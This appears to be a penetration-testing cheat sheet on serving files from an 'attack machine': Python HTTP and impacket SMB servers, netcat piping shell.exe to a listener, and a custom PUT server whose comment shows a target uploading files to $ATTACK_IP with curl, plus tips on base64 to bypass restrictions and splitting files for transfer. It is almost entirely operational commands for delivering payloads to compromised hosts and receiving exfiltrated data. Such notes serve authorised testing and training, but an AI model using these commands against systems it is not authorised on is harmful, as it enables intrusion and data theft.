# Serving Files (Attack Machine)

## Python HTTP Server
```bash
# Python 3
python3 -m http.server 80
python3 -m http.server 8000

# Python 2
python2 -m SimpleHTTPServer 80
```

## SMB Share
```bash
sudo impacket-smbserver share /path/to/files -smb2support
```

## Netcat
```bash
cat shell.exe | nc -lvnp 4444
```

## Custom Upload Server
```python
python3 -c "
import http.server, os
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        with open(self.path[1:], 'wb') as f:
            f.write(self.rfile.read(length))
http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
# Target uploads with: curl -T file http://$ATTACK_IP/
```

## Tips
1. Check if **wget/curl** exists on target first
2. **PowerShell** is available on all modern Windows
3. If firewall blocks HTTP, try **SMB share**
4. **Base64 encoding** can bypass text-based restrictions
5. Split large files: `split -b 10M largefile` then `cat` on target
